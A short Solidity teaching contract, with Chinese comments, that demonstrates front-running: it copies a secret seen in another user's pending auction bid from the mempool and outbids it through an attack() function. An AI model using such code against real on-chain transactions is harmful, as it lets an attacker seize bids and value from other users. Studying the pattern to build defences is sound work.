// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAuction {
    function bid(string calldata secret) external payable;
    function highestBid() external view returns (uint256);
}

/// @title FrontRunner - 抢先交易演示
/// 学生在 mempool 看到了别人对 bid("topsecret") 的调用
/// 用更高 gas 价 + 更高出价抢跑
contract FrontRunner {
    IAuction public auction;
    string public secret;

    constructor(address _auction) {
        auction = IAuction(_auction);
        secret = "topsecret";
    }

    function attack() external payable {
        // 直接用更高出价 bid，演示抢先交易
        auction.bid{value: msg.value}(secret);
    }

    receive() external payable {}
}
